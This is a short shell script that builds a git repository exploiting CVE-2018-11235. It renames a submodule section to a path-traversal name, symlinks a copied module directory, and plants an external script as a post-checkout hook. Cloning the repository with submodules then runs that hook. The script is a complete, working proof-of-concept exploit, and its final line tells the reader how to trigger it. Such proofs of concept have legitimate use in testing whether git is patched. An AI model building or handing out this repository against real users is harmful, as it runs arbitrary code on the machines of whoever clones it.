#!/bin/sh

set -e

repo_dir="$PWD/repo"
repo_submodule='https://github.com/octocat/Spoon-Knife'

git init "$repo_dir"
cd "$repo_dir"
git submodule add "$repo_submodule" evil
mkdir -p modules/1/2/3/4
cp -r .git/modules/evil modules/1/2/3/4
cd modules
ln -s 1/2/3/4/evil evil
cd ..
cp ../evil.sh modules/evil/hooks/post-checkout
git config -f .gitmodules submodule.evil.update checkout
git config -f .gitmodules --rename-section submodule.evil submodule.../../modules/evil
git add modules
git submodule add "$repo_submodule"
git add Spoon-Knife
git commit -am CVE-2018-11235
echo "All done, now \`git clone --recurse-submodules \"$repo_dir\" dest_dir\`"
